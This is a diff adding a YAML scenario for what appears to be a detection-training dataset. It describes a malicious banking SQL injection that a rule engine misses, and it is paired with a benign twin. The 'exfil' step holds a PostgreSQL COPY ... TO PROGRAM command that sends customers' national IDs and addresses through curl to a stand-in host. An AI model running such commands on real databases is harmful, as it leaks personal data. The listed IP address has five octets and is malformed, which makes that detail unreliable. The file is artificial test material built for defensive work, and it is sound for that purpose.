@@ -1,0 +1,32 @@
+scenario_id: gen_banking_97_sql_injection_mal_2740m
+family_id: gen_banking_97_sql_injection_fam_2740
+domain: banking
+time_of_day: 00:05
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: inject
+  role: batch_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 3.0
+  events:
+  - step_id: probe
+    sql: SELECT national_id, address FROM customers WHERE customer_id > 913777
+  - step_id: exfil
+    sql: COPY (SELECT national_id, address FROM customers) TO PROGRAM 'curl -sX POST
+      https://sync.partner-mirror.example/ingest -d @-'
+    connects_to:
+      ip: 141.98.11.162.51
+      port: 9443
+matched_pair_id: gen_banking_97_sql_injection_pair_2740
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
